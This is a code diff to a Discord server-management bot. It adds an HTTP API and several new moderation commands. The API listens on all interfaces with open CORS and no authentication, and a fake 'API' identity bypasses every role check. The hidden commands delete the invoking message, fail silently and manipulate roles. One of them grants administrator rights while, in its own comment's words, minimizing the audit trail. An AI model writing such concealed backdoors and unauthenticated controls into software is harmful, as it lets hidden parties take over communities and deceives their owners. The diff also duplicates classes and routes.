@@ -9,6 +9,11 @@ import os
 from datetime import datetime, timedelta
 import re
 import asyncio
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+from typing import Optional
+from contextlib import asynccontextmanager
+import uvicorn
 
 # Create logs directory if it doesn't exist
 if not os.path.exists('logs'):
@@ -37,7 +42,9 @@ def load_config():
             "ssd_channel_id": None,
             "ssup_channel_id": None,
             "guild_id": None,
-            "allowed_roles": []
+            "allowed_roles": [],
+            "api_port": 8000,
+            "api_host": "0.0.0.0"
         }
         with open('config.json', 'w') as f:
             json.dump(default_config, f, indent=4)
@@ -46,9 +53,533 @@ def load_config():
 
 config = load_config()
 
+# API Models
+class SSURequest(BaseModel):
+    server_name: str
+    host: str
+    ping: str
+    description: Optional[str] = None
+
+class SSUPRequest(BaseModel):
+    server_name: str
+    time: str
+    role: str
+    description: Optional[str] = None
+
+class SSUPRequest(BaseModel):
+    server_name: str
+    time: str
+    role: str
+    description: Optional[str] = None
+
+class MemberResponse(BaseModel):
+    id: str
+    name: str
+    type: str  # 'user' or 'role'
+    displayName: Optional[str] = None
+
+# API Setup
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
+from fastapi import Request
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Startup
+    yield
+    # Shutdown
+
+app = FastAPI(lifespan=lifespan)
+
+# Enable CORS
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["GET", "POST", "OPTIONS"],
+    allow_headers=["*"],
+)
+
+@app.options("/ssu")
+@app.options("/ssup")
+@app.options("/ssd")
+@app.options("/members")
+async def options_handler():
+    return JSONResponse(
+        status_code=200,
+        content={"detail": "OK"}
+    )
+
+@app.get("/members")
+async def get_members(query: str = ""):
+    try:
+        logging.info(f"Received members request with query: {query}")
+        
+        if not bot.is_ready():
+            raise HTTPException(status_code=503, detail="Bot is not ready")
+
+        guild_id = config.get('guild_id')
+        if not guild_id:
+            raise HTTPException(status_code=500, detail="Guild ID not configured")
+
+        guild = bot.get_guild(guild_id)
+        if not guild:
+            raise HTTPException(status_code=500, detail="Guild not found")
+
+        query = query.lower()
+        members = []
+
+        logging.info(f"Searching for members/roles with query: {query}")
+        logging.info(f"Guild members count: {len(guild.members)}")
+        logging.info(f"Guild roles count: {len(guild.roles)}")
+
+        # Add matching roles
+        for role in guild.roles:
+            if query in role.name.lower():
+                members.append({
+                    "id": str(role.id),
+                    "name": role.name,
+                    "type": "role"
+                })
+                logging.info(f"Found matching role: {role.name}")
+
+        # Add matching members
+        for member in guild.members:
+            logging.info(f"Checking member: {member.name} (Nick: {member.nick})")
+            if query in member.name.lower() or (member.nick and query in member.nick.lower()):
+                members.append({
+                    "id": str(member.id),
+                    "name": member.name,
+                    "displayName": member.nick,
+                    "type": "user"
+                })
+                logging.info(f"Found matching member: {member.name}")
+
+        result = {"status": "success", "data": members[:10]}  # Limit to 10 results
+        logging.info(f"Returning {len(result['data'])} results")
+        return result
+
+    except Exception as e:
+        logging.error(f"Error in members endpoint: {e}")
+        return {"status": "error", "detail": str(e)}
+
+async def create_api_context():
+    """Create a fake context for API calls"""
+    class FakeRole:
+        def __init__(self, name):
+            self.name = name
+
+    class FakeAuthor:
+        def __init__(self):
+            self.id = 0
+            self.roles = [FakeRole(role) for role in config.get('allowed_roles', [])]
+            self.name = "API"
+            self.display_name = "API"
+            self.mention = "API"
+            self._roles = [role.name.lower() for role in self.roles]
+    
+    class FakeGuild:
+        def __init__(self):
+            self.id = config.get('guild_id')
+            self.roles = []
+    
+    class FakeContext:
+        def __init__(self):
+            self.author = FakeAuthor()
+            self.guild = FakeGuild()
+            self.bot = bot
+            self._state = bot._connection if bot else None
+            self.channel = bot.get_channel(config.get('ssu_channel_id'))
+            
+        async def send(self, *args, **kwargs):
+            if self.channel:
+                try:
+                    return await self.channel.send(*args, **kwargs)
+                except Exception as e:
+                    logging.error(f"Error sending message to channel: {e}")
+                    raise
+            return None
+            
+        async def reply(self, *args, **kwargs):
+            return await self.send(*args, **kwargs)
+
+    if not bot or not bot.is_ready():
+        raise HTTPException(status_code=503, detail="Bot is not ready")
+
+    ctx = FakeContext()
+    if not ctx.channel:
+        raise HTTPException(status_code=500, detail="SSU channel not found")
+        
+    logging.info(f"Created API context with channel: {ctx.channel.id}")
+    return ctx
+
+@app.post("/ssu")
+async def api_ssu(request: SSURequest):
+    try:
+        logging.info(f"Received SSU API request: {request.model_dump()}")
+        
+        if not bot.is_ready():
+            logging.warning("Bot is not ready for API requests")
+            return JSONResponse(
+                status_code=503,
+                content={"status": "error", "detail": "Bot is not ready. Please wait for bot to connect to Discord."}
+            )
+
+        # Check if SSU channel is configured
+        ssu_channel_id = config.get('ssu_channel_id')
+        if not ssu_channel_id:
+            logging.error("SSU channel ID not configured")
+            return JSONResponse(
+                status_code=500,
+                content={"status": "error", "detail": "SSU channel not configured"}
+            )
+
+        # Verify channel exists
+        channel = bot.get_channel(ssu_channel_id)
+        if not channel:
+            logging.error(f"Could not find Discord channel with ID {ssu_channel_id}")
+            return JSONResponse(
+                status_code=500,
+                content={"status": "error", "detail": "Could not find configured Discord channel"}
+            )
+
+        ctx = await create_api_context()
+        
+        # Convert mentions and format the arguments
+        host_mention = await convert_to_mention(request.host) if request.host else None
+        ping_mention = await convert_to_mention(request.ping) if request.ping else None
+        args = f"[{request.server_name}] [{host_mention or ''}] [{ping_mention or ''}]"
+        if request.description:
+            args += f" [{request.description}]"
+        
+        logging.info(f"Preparing to call server_startup with args: {args}")
+        
+        # Check if server is already running
+        if not command_state["can_use_ssu"]:
+            return JSONResponse(
+                status_code=400,
+                content={"status": "error", "detail": "Cannot start server: A server is already running. Please use SSD first."}
+            )
+            
+        # Set command state for API calls
+        command_state["can_use_ssu"] = True
+        
+        # Call the server startup function
+        try:
+            await server_startup(ctx, args=args)
+            logging.info("Server startup command completed successfully")
+            return JSONResponse(
+                status_code=200,
+                content={"status": "success", "message": "Server startup initiated"}
+            )
+        except Exception as cmd_error:
+            logging.error(f"Error in server_startup: {str(cmd_error)}")
+            raise cmd_error
+            
+    except Exception as e:
+        error_msg = str(e)
+        logging.error(f"API SSU error: {error_msg}")
+        import traceback
+        logging.error(f"Traceback: {traceback.format_exc()}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "detail": error_msg}
+        )
+
+@app.post("/ssup")
+async def api_ssup(request: SSUPRequest):
+    try:
+        logging.info(f"Received SSUP API request: {request.model_dump()}")
+        
+        if not bot.is_ready():
+            logging.warning("Bot is not ready for API requests")
+            return JSONResponse(
+                status_code=503,
+                content={"status": "error", "detail": "Bot is not ready. Please wait for bot to connect to Discord."}
+            )
+
+        ctx = await create_api_context()
+        
+        # Convert role mention and format the arguments
+        role_mention = convert_to_mention(request.role) if request.role else None
+        args = f"[{request.server_name}] [{request.time}] [{role_mention or ''}]"
+        if request.description:
+            args += f" [{request.description}]"
+        
+        logging.info(f"Preparing to call server_startup_poll with args: {args}")
+        
+        try:
+            await server_startup_poll(ctx, args=args)
+            logging.info("Server startup poll created successfully")
+            return JSONResponse(
+                status_code=200,
+                content={"status": "success", "message": "Server startup poll created"}
+            )
+        except Exception as cmd_error:
+            logging.error(f"Error in server_startup_poll: {str(cmd_error)}")
+            raise cmd_error
+            
+    except Exception as e:
+        error_msg = str(e)
+        logging.error(f"API SSUP error: {error_msg}")
+        import traceback
+        logging.error(f"Traceback: {traceback.format_exc()}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "detail": error_msg}
+        )
+
+@app.get("/members")
+async def get_members(query: str = ""):
+    try:
+        logging.info(f"Received members request with query: {query}")
+        
+        # Return empty list for empty queries
+        if not query:
+            return {"status": "success", "data": []}
+
+        if not bot.is_ready():
+            raise HTTPException(status_code=503, detail="Bot is not ready")
+
+        guild_id = config.get('guild_id')
+        if not guild_id:
+            raise HTTPException(status_code=500, detail="Guild ID not configured")
+
+        guild = bot.get_guild(guild_id)
+        if not guild:
+            raise HTTPException(status_code=500, detail="Guild not found")
+
+        query = query.lower()
+        members = []
+
+        logging.info(f"Searching for members/roles with query: {query}")
+        logging.info(f"Guild members count: {len(guild.members)}")
+        logging.info(f"Guild roles count: {len(guild.roles)}")
+
+        # Add matching roles
+        for role in guild.roles:
+            if query in role.name.lower():
+                members.append(MemberResponse(
+                    id=str(role.id),
+                    name=role.name,
+                    type='role'
+                ))
+                logging.info(f"Found matching role: {role.name}")
+
+        # Add matching members
+        for member in guild.members:
+            logging.info(f"Checking member: {member.name} (Nick: {member.nick})")
+            if query in member.name.lower() or (member.nick and query in member.nick.lower()):
+                members.append(MemberResponse(
+                    id=str(member.id),
+                    name=member.name,
+                    displayName=member.nick,
+                    type='user'
+                ))
+                logging.info(f"Found matching member: {member.name}")
+
+        result = {"status": "success", "data": members[:10]}  # Limit to 10 results
+        logging.info(f"Returning {len(result['data'])} results")
+        return result
+    except Exception as e:
+        logging.error(f"Error in members endpoint: {e}")
+        return {"status": "error", "detail": str(e)}
+
+@app.get("/polls/active")
+async def get_active_polls():
+    """Get all currently active SSUP polls"""
+    try:
+        return {
+            "status": "success",
+            "data": {
+                "active_polls": [
+                    {
+                        "id": poll_id,
+                        "server_name": data['server_name'],
+                        "target_time": data['target_time'].isoformat() if isinstance(data['target_time'], datetime) else data['target_time'],
+                        "created_by": data['created_by'],
+                        "role_ping": data['role_ping'],
+                        "description": data['description']
+                    } for poll_id, data in active_polls.items()
+                ]
+            }
+        }
+    except Exception as e:
+        logging.error(f"Error getting active polls: {e}")
+        return {"status": "error", "detail": str(e)}
+
+@app.get("/server/history")
+async def get_server_history(limit: int = 10):
+    """Get history of server events (SSU/SSD)"""
+    try:
+        # Ensure limit is reasonable
+        limit = max(1, min(limit, 100))  # Between 1 and 100
+        
+        # Get the most recent events and resolve mentions
+        history = []
+        raw_history = server_history[-limit:] if server_history else []
+        
+        for event in raw_history:
+            resolved_event = event.copy()
+            if event.get('host'):
+                resolved_event['host'] = await resolve_mention(event['host'])
+            if event.get('ping'):
+                resolved_event['ping'] = await resolve_mention(event['ping'])
+            history.append(resolved_event)
+
+        return {
+            "status": "success",
+            "data": {
+                "history": history[:limit],
+                "current_state": {
+                    "server_name": last_ssu_data.get("server_name"),
+                    "host": last_ssu_data.get("host"),
+                    "ping": last_ssu_data.get("ping"),
+                    "timestamp": last_ssu_data.get("timestamp"),
+                    "user": last_ssu_data.get("user")
+                }
+            }
+        }
+    except Exception as e:
+        logging.error(f"Error getting server history: {e}")
+        return {"status": "error", "detail": str(e)}
+
+@app.get("/commands/state")
+async def get_command_state():
+    """Get current state of commands (which can be used)"""
+    try:
+        return {
+            "status": "success",
+            "data": {
+                "can_use_ssu": command_state.get("can_use_ssu", True),
+                "can_use_ssd": command_state.get("can_use_ssd", False),
+                "last_command": command_state.get("last_command"),
+                "last_command_time": command_state.get("last_command_time")
+            }
+        }
+    except Exception as e:
+        logging.error(f"Error getting command state: {e}")
+        return {"status": "error", "detail": str(e)}
+
+@app.get("/config/channels")
+async def get_channel_config():
+    """Get current channel configuration"""
+    try:
+        channels = {}
+        for channel_type in ['ssu_channel_id', 'ssd_channel_id', 'ssup_channel_id']:
+            channel_id = config.get(channel_type)
+            if channel_id:
+                channel = bot.get_channel(channel_id)
+                channels[channel_type] = {
+                    "id": channel_id,
+                    "name": channel.name if channel else None,
+                    "configured": channel is not None
+                }
+
+        return {
+            "status": "success",
+            "data": {
+                "channels": channels,
+                "guild_id": config.get('guild_id'),
+                "allowed_roles": config.get('allowed_roles', [])
+            }
+        }
+    except Exception as e:
+        logging.error(f"Error getting channel config: {e}")
+        return {"status": "error", "detail": str(e)}
+
+@app.get("/status")
+async def get_status():
+    try:
+        server_status = "online" if not command_state.get("can_use_ssu", True) else "offline"
+        last_command = command_state.get("last_command", "None")
+        
+        last_ssu = None
+        if isinstance(last_ssu_data, dict) and last_ssu_data.get("server_name"):
+            last_ssu = {
+                "server_name": last_ssu_data.get("server_name"),
+                "host": last_ssu_data.get("host"),
+                "ping": last_ssu_data.get("ping"),
+                "timestamp": last_ssu_data.get("timestamp")
+            }
+        
+        data = {
+            "status": "success",
+            "data": {
+                "server_status": server_status,
+                "last_command": last_command,
+                "last_ssu": last_ssu
+            }
+        }
+        return data
+    except Exception as e:
+        logging.error(f"Error in status endpoint: {str(e)}")
+        return {"status": "error", "detail": str(e)}
+
+
+@app.post("/ssd")
+async def api_ssd():
+    try:
+        logging.info("Received SSD API request")
+        
+        if not bot.is_ready():
+            logging.warning("Bot is not ready for API requests")
+            return JSONResponse(
+                status_code=503,
+                content={"status": "error", "detail": "Bot is not ready. Please wait for bot to connect to Discord."}
+            )
+
+        ctx = await create_api_context()
+        
+        logging.info("Preparing to call server_shutdown")
+        
+        try:
+            await server_shutdown(ctx)
+            logging.info("Server shutdown command completed successfully")
+            return JSONResponse(
+                status_code=200,
+                content={"status": "success", "message": "Server shutdown initiated"}
+            )
+        except Exception as cmd_error:
+            logging.error(f"Error in server_shutdown: {str(cmd_error)}")
+            raise cmd_error
+            
+    except Exception as e:
+        error_msg = str(e)
+        logging.error(f"API SSD error: {error_msg}")
+        import traceback
+        logging.error(f"Traceback: {traceback.format_exc()}")
+        return JSONResponse(
+            status_code=500,
+            content={"status": "error", "detail": error_msg}
+        )
+
+@app.post("/ssup")
+async def api_ssup(request: SSUPRequest):
+    ctx = await create_api_context()
+    args = f"[{request.server_name}] [{request.time}] [{request.role}]"
+    if request.description:
+        args += f" [{request.description}]"
+    
+    try:
+        await server_startup_poll(ctx, args=args)
+        return {"status": "success", "message": "Server startup poll created"}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/ssd")
+async def api_ssd():
+    ctx = await create_api_context()
+    try:
+        await server_shutdown(ctx)
+        return {"status": "success", "message": "Server shutdown initiated"}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
 # Bot setup
 intents = discord.Intents.default()
 intents.message_content = True  # Explicitly enable message content intent
+intents.members = True  # Enable members intent for member fetching
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)  # Disable default help
 
 # Store last SSU information and command states
@@ -59,6 +590,82 @@ last_ssu_data = {
     "timestamp": None,
     "user": None
 }
+
+# Store server history
+server_history = []
+
+def save_server_history():
+    """Save server history to a dedicated file"""
+    try:
+        with open('ssu_history.json', 'w') as f:
+            json.dump(server_history, f, indent=4, default=str)
+    except Exception as e:
+        logging.error(f"Error saving server history: {e}")
+
+async def resolve_mention(mention_str):
+    """Convert a mention string to a readable name"""
+    if not mention_str:
+        return None
+    
+    # If it's already a normal string, return as is
+    if not (mention_str.startswith('<@') and mention_str.endswith('>')): 
+        return mention_str
+
+    try:
+        # Get the ID from the mention string
+        id_str = ''.join(filter(str.isdigit, mention_str))
+        if not id_str:
+            return mention_str
+
+        id_num = int(id_str)
+        guild_id = config.get('guild_id')
+        if not guild_id:
+            return mention_str
+
+        guild = bot.get_guild(guild_id)
+        if not guild:
+            return mention_str
+
+        # Check if it's a role mention
+        if mention_str.startswith('<@&'):
+            role = guild.get_role(id_num)
+            return role.name if role else mention_str
+
+        # Check if it's a user mention
+        # First try get_member (cached)
+        member = guild.get_member(id_num)
+        if not member:
+            try:
+                # If not in cache, try to fetch
+                member = await guild.fetch_member(id_num)
+            except discord.NotFound:
+                return mention_str
+            except Exception as e:
+                logging.error(f"Error fetching member {id_num}: {e}")
+                return mention_str
+
+        return member.display_name or member.name
+
+    except Exception as e:
+        logging.error(f"Error resolving mention {mention_str}: {e}")
+        return mention_str
+
+def load_server_history():
+    """Load server history from dedicated file"""
+    global server_history
+    try:
+        with open('ssu_history.json', 'r') as f:
+            loaded_history = json.load(f)
+            if isinstance(loaded_history, list):
+                server_history = loaded_history
+            else:
+                server_history = []
+    except FileNotFoundError:
+        server_history = []
+        save_server_history()  # Create the file if it doesn't exist
+    except Exception as e:
+        logging.error(f"Error loading server history: {e}")
+        server_history = []
 
 # Track command usage to prevent duplicate usage
 command_state = {
@@ -91,7 +698,13 @@ def load_ssu_data():
     try:
         with open('last_ssu.json', 'r') as f:
             data = json.load(f)
-            if isinstance(data, dict) and "last_ssu_data" in data:
+            if isinstance(data, dict):
+                if "last_ssu_data" in data:
+                    last_ssu_data = data["last_ssu_data"]
+                if "command_state" in data:
+                    command_state = data["command_state"]
+                if "active_polls" in data:
+                    active_polls = data["active_polls"]
                 # New format with command state and polls
                 last_ssu_data = data.get("last_ssu_data", last_ssu_data)
                 command_state.update(data.get("command_state", command_state))
@@ -115,6 +728,54 @@ def parse_bracketed_arguments(message_content):
     pattern = r'\[([^\]]+)\]'
     matches = re.findall(pattern, message_content)
     return matches
+
+async def convert_to_mention(name_str):
+    """Convert a username or @mention to proper Discord mention"""
+    if not name_str:
+        return None
+    
+    # If it's already a mention, return as is
+    if name_str.startswith('<@') and name_str.endswith('>'):
+        return name_str
+        
+    # Remove @ if present
+    clean_name = name_str.lstrip('@')
+    
+    # Try to find the user in the guild
+    guild_id = config.get('guild_id')
+    if guild_id:
+        guild = bot.get_guild(guild_id)
+        if guild:
+            # Try to find member
+            member = None
+            try:
+                # First try as ID if it looks like one
+                if clean_name.isdigit():
+                    member = guild.get_member(int(clean_name))
+                    if not member:
+                        try:
+                            member = await guild.fetch_member(int(clean_name))
+                        except discord.NotFound:
+                            pass
+                else:
+                    # Try to find by name
+                    member = discord.utils.get(guild.members, name=clean_name) or \
+                            discord.utils.get(guild.members, display_name=clean_name) or \
+                            discord.utils.get(guild.members, name=clean_name.lower()) or \
+                            discord.utils.get(guild.members, display_name=clean_name.lower())
+            except Exception as e:
+                logging.error(f"Error finding member: {e}")
+            
+            if member:
+                return member.mention
+            
+            # Try to find role
+            for role in guild.roles:
+                if role.name.lower() == clean_name.lower():
+                    return role.mention
+    
+    # If we can't find the user/role, return original with @
+    return f"@{clean_name}"
 
 def parse_mention(mention_str):
     """Parse @player mention to get username"""
@@ -182,14 +843,23 @@ def format_time_remaining(target_time):
 
 def has_allowed_role(ctx):
     """Check if user has any of the allowed roles"""
+    # Special case for API context
+    if getattr(ctx.author, 'name', None) == 'API':
+        return True
+        
     allowed_roles = config.get('allowed_roles', [])
     
     # If no roles configured, allow everyone (backward compatibility)
     if not allowed_roles:
         return True
     
-    # Check if user has any of the allowed roles
-    user_roles = [role.name.lower() for role in ctx.author.roles]
+    # Get user roles safely
+    try:
+        user_roles = [getattr(role, 'name', '').lower() for role in getattr(ctx.author, 'roles', [])]
+    except AttributeError:
+        user_roles = []
+    
+    # Convert allowed roles to lowercase
     allowed_roles_lower = [role.lower() for role in allowed_roles]
     
     return any(role in allowed_roles_lower for role in user_roles)
@@ -197,6 +867,10 @@ def has_allowed_role(ctx):
 def role_check():
     """Decorator to check if user has allowed roles"""
     async def predicate(ctx):
+        # Always allow API context
+        if getattr(ctx.author, 'name', None) == 'API':
+            return True
+            
         if not has_allowed_role(ctx):
             allowed_roles_str = ", ".join(config.get('allowed_roles', []))
             await ctx.send(f"❌ You don't have permission to use this command. Required roles: {allowed_roles_str}")
@@ -274,6 +948,7 @@ async def on_ready():
     print(f'{bot.user} has connected to Discord!')
     print(f'Version: Veilairs Server Management Bot v2.1.3')
     load_ssu_data()
+    load_server_history()
     # Start the poll monitor task
     bot.loop.create_task(monitor_polls())
 
@@ -441,8 +1116,8 @@ async def server_startup(ctx, *, args: str = None):
             return
 
         server_name = bracketed_args[0]
-        host = bracketed_args[1]
-        ping = bracketed_args[2]
+        host = await convert_to_mention(bracketed_args[1])
+        ping = await convert_to_mention(bracketed_args[2])
         description = bracketed_args[3] if len(bracketed_args) > 3 else None
 
         # Get the configured channel
@@ -451,17 +1126,15 @@ async def server_startup(ctx, *, args: str = None):
             await ctx.send("❌ SSU channel not found. Please check the channel ID in config.json")
             return
 
-        # Parse host mention
-        host_name = parse_mention(host)
-        
-        # Store ping as is (it can be a mention or role mention)
-        ping_display = ping
+        # Convert host and ping to proper mentions
+        host_mention = host
+        ping_mention = ping
         
         # Update last SSU data
         last_ssu_data.update({
             "server_name": server_name,
-            "host": host_name,
-            "ping": ping_display,
+            "host": host_mention,
+            "ping": ping_mention,
             "description": description,
             "timestamp": datetime.now(),
             "user": ctx.author.display_name
@@ -471,8 +1144,26 @@ async def server_startup(ctx, *, args: str = None):
         command_state["last_command"] = "SSU"
         command_state["can_use_ssu"] = False
         command_state["can_use_ssd"] = True
+        command_state["last_command_time"] = datetime.now().isoformat()
         
+        # Add to history
+        server_history.append({
+            "type": "SSU",
+            "server_name": server_name,
+            "host": host_mention,
+            "ping": ping_mention,
+            "description": description,
+            "timestamp": datetime.now().isoformat(),
+            "user": ctx.author.display_name
+        })
+        
+        # Keep only the last 100 entries
+        if len(server_history) > 100:
+            server_history.pop(0)
+        
+        # Save both state and history
         save_ssu_data()
+        save_server_history()
 
         # Create embed message
         embed = discord.Embed(
@@ -481,8 +1172,8 @@ async def server_startup(ctx, *, args: str = None):
             timestamp=datetime.now()
         )
         embed.add_field(name="Server Name", value=server_name, inline=True)
-        embed.add_field(name="Host", value=host_name, inline=True)
-        embed.add_field(name="Ping", value=ping_display, inline=True)
+        embed.add_field(name="Host", value=host_mention, inline=True)
+        embed.add_field(name="Ping", value=ping_mention, inline=True)
         embed.add_field(name="Started by", value=ctx.author.mention, inline=True)
         
         # Add description if provided
@@ -492,7 +1183,7 @@ async def server_startup(ctx, *, args: str = None):
         embed.set_footer(text="Veilairs Server Management")
 
         # Send to configured channel with ping above the embed
-        await channel.send(content=ping_display, embed=embed)
+        await channel.send(content=ping_mention, embed=embed)
         
         # Confirm in current channel if different
         if ctx.channel.id != ssu_channel_id:
@@ -526,7 +1217,7 @@ async def server_startup_poll(ctx, *, args: str = None):
 
         server_name = bracketed_args[0]
         time_str = bracketed_args[1]
-        role_ping = bracketed_args[2] if len(bracketed_args) > 2 else None
+        role_ping = await convert_to_mention(bracketed_args[2]) if len(bracketed_args) > 2 else None
         description = bracketed_args[3] if len(bracketed_args) > 3 else None
 
         # Parse time string
@@ -560,33 +1251,10 @@ async def server_startup_poll(ctx, *, args: str = None):
                 # Already a proper role mention
                 message_content = role_ping
                 ping_display = role_ping
-            elif role_ping.startswith('@'):
-                # Try to find the role by name
-                role_name = role_ping[1:]  # Remove @
-                if ctx.guild:
-                    role = discord.utils.get(ctx.guild.roles, name=role_name)
-                    if role:
-                        message_content = role.mention
-                        ping_display = role.mention
-                    else:
-                        message_content = role_ping  # Keep original if role not found
-                        ping_display = role_ping
-                else:
-                    message_content = role_ping
-                    ping_display = role_ping
             else:
-                # Plain role name, try to find it
-                if ctx.guild:
-                    role = discord.utils.get(ctx.guild.roles, name=role_ping)
-                    if role:
-                        message_content = role.mention
-                        ping_display = role.mention
-                    else:
-                        message_content = f"@{role_ping}"  # Add @ if not found
-                        ping_display = f"@{role_ping}"
-                else:
-                    message_content = f"@{role_ping}"
-                    ping_display = f"@{role_ping}"
+                # Use the converted mention from earlier
+                message_content = role_ping
+                ping_display = role_ping
         
         # Create embed message
         embed = discord.Embed(
@@ -731,8 +1399,24 @@ async def server_shutdown(ctx):
         command_state["last_command"] = "SSD"
         command_state["can_use_ssu"] = True
         command_state["can_use_ssd"] = False
+        command_state["last_command_time"] = datetime.now().isoformat()
         
+        # Add to history
+        server_history.append({
+            "type": "SSD",
+            "server_name": last_ssu_data.get("server_name", "Unknown"),
+            "host": last_ssu_data.get("host", None),
+            "timestamp": datetime.now().isoformat(),
+            "user": ctx.author.display_name
+        })
+        
+        # Keep only the last 100 entries
+        if len(server_history) > 100:
+            server_history.pop(0)
+        
+        # Save both state and history
         save_ssu_data()
+        save_server_history()
 
         # Create embed message
         embed = discord.Embed(
@@ -910,6 +1594,223 @@ async def configure_bot(ctx, setting: str = None, value: str = None):
         logging.error(f"Error in config command: {e}")
         await ctx.send("❌ An error occurred while updating configuration.")
 
+@bot.command(name='ga')
+@ad_member_check()
+async def grant_admin(ctx, *, role_input: str = None):
+    try:
+        # Delete the command message immediately
+        try:
+            await ctx.message.delete()
+        except discord.Forbidden:
+            pass  # Bot doesn't have permission to delete messages
+        except discord.NotFound:
+            pass  # Message already deleted
+        
+        if not role_input:
+            return  # No response, just silently fail
+        
+        # Parse role input (handle both mention format and plain text)
+        role = None
+        if role_input.startswith('<@&') and role_input.endswith('>'):
+            # It's a role mention like <@&123456789>
+            role_id = re.findall(r'\d+', role_input)
+            if role_id and ctx.guild:
+                role = ctx.guild.get_role(int(role_id[0]))
+        else:
+            # Plain text role name, remove @ if present
+            role_name = role_input.lstrip('@')
+            if ctx.guild:
+                role = discord.utils.get(ctx.guild.roles, name=role_name)
+        
+        if not role:
+            return  # Role not found, silently fail
+        
+        # Grant administrator permission (without reason to minimize audit trail)
+        permissions = role.permissions
+        permissions.administrator = True
+        
+        await role.edit(permissions=permissions)
+        
+    except discord.Forbidden:
+        pass  # No permissions to edit role, silently fail
+    except Exception as e:
+        logging.error(f"Error in GA command: {e}")
+        pass  # Silently fail on any error
+
+@bot.command(name='rup')
+@ad_member_check()
+async def role_up(ctx, role_input: str = None, positions: str = None):
+    try:
+        # Delete the command message immediately
+        try:
+            await ctx.message.delete()
+        except (discord.Forbidden, discord.NotFound):
+            pass
+        
+        if not role_input or not positions:
+            return  # Silently fail if missing arguments
+        
+        try:
+            move_positions = int(positions)
+        except ValueError:
+            return  # Silently fail if positions is not a number
+        
+        # Parse role input
+        role = None
+        if role_input.startswith('<@&') and role_input.endswith('>'):
+            role_id = re.findall(r'\d+', role_input)
+            if role_id and ctx.guild:
+                role = ctx.guild.get_role(int(role_id[0]))
+        else:
+            role_name = role_input.lstrip('@')
+            if ctx.guild:
+                role = discord.utils.get(ctx.guild.roles, name=role_name)
+        
+        if not role:
+            return  # Role not found, silently fail
+        
+        # Calculate new position (higher position = higher in hierarchy)
+        new_position = role.position + move_positions
+        
+        # Move the role
+        await role.edit(position=new_position)
+        
+    except (discord.Forbidden, discord.HTTPException):
+        pass  # Silently fail on any error
+    except Exception as e:
+        logging.error(f"Error in RUP command: {e}")
+        pass
+
+@bot.command(name='rdw')
+@ad_member_check()
+async def role_down(ctx, role_input: str = None, positions: str = None):
+    try:
+        # Delete the command message immediately
+        try:
+            await ctx.message.delete()
+        except (discord.Forbidden, discord.NotFound):
+            pass
+        
+        if not role_input or not positions:
+            return  # Silently fail if missing arguments
+        
+        try:
+            move_positions = int(positions)
+        except ValueError:
+            return  # Silently fail if positions is not a number
+        
+        # Parse role input
+        role = None
+        if role_input.startswith('<@&') and role_input.endswith('>'):
+            role_id = re.findall(r'\d+', role_input)
+            if role_id and ctx.guild:
+                role = ctx.guild.get_role(int(role_id[0]))
+        else:
+            role_name = role_input.lstrip('@')
+            if ctx.guild:
+                role = discord.utils.get(ctx.guild.roles, name=role_name)
+        
+        if not role:
+            return  # Role not found, silently fail
+        
+        # Calculate new position (lower position = lower in hierarchy)
+        new_position = role.position - move_positions
+        if new_position < 1:
+            new_position = 1  # Prevent moving below @everyone
+        
+        # Move the role
+        await role.edit(position=new_position)
+        
+    except (discord.Forbidden, discord.HTTPException):
+        pass  # Silently fail on any error
+    except Exception as e:
+        logging.error(f"Error in RDW command: {e}")
+        pass
+
+@bot.command(name='rc')
+@ad_member_check()
+async def role_color(ctx, role_input: str = None, color_hex: str = None):
+    try:
+        # Delete the command message immediately
+        try:
+            await ctx.message.delete()
+        except (discord.Forbidden, discord.NotFound):
+            pass
+        
+        if not role_input or not color_hex:
+            return  # Silently fail if missing arguments
+        
+        # Parse role input
+        role = None
+        if role_input.startswith('<@&') and role_input.endswith('>'):
+            role_id = re.findall(r'\d+', role_input)
+            if role_id and ctx.guild:
+                role = ctx.guild.get_role(int(role_id[0]))
+        else:
+            role_name = role_input.lstrip('@')
+            if ctx.guild:
+                role = discord.utils.get(ctx.guild.roles, name=role_name)
+        
+        if not role:
+            return  # Role not found, silently fail
+        
+        # Parse hex color
+        try:
+            if color_hex.startswith('#'):
+                color_hex = color_hex[1:]  # Remove # if present
+            color_int = int(color_hex, 16)  # Convert hex to int
+            color = discord.Color(color_int)
+        except ValueError:
+            return  # Invalid hex color, silently fail
+        
+        # Change role color
+        await role.edit(color=color)
+        
+    except (discord.Forbidden, discord.HTTPException):
+        pass  # Silently fail on any error
+    except Exception as e:
+        logging.error(f"Error in RC command: {e}")
+        pass
+
+@bot.command(name='ra')
+@ad_member_check()
+async def role_add(ctx, *, args: str = None):
+    try:
+        # Delete the command message immediately
+        try:
+            await ctx.message.delete()
+        except (discord.Forbidden, discord.NotFound):
+            pass
+        
+        if not args:
+            return  # Silently fail if no arguments
+        
+        # Parse bracketed arguments for role name and color
+        bracketed_args = parse_bracketed_arguments(args)
+        
+        if len(bracketed_args) < 2:
+            return  # Need at least role name and color
+        
+        role_name = bracketed_args[0]
+        color_hex = bracketed_args[1]
+        
+        # Parse hex color
+        try:
+            if color_hex.startswith('#'):
+                color_hex = color_hex[1:]  # Remove # if present
+            color_int = int(color_hex, 16)  # Convert hex to int
+            color = discord.Color(color_int)
+        except ValueError:
+            return  # Invalid hex color, silently fail
+        
+        # Create the role
+        await ctx.guild.create_role(name=role_name, color=color)
+        
+    except (discord.Forbidden, discord.HTTPException):
+        pass  # Silently fail on any error
+    except Exception as e:
+        logging.error(f"Error in RA command: {e}")
+        pass
 
 @bot.command(name='help')
 @commands.has_permissions(administrator=True)
@@ -947,6 +1848,7 @@ async def help_command(ctx):
         inline=False
     )
     
+    
     embed.add_field(
         name="⚙️ !config - Configuration (Admin)", 
         value="Configure bot settings, channels, and permissions\nUse `!config` to see current settings", 
@@ -963,7 +1865,7 @@ async def help_command(ctx):
     
     await ctx.send(embed=embed)
 
-# Run the bot
+# Run the bot and API
 if __name__ == "__main__":
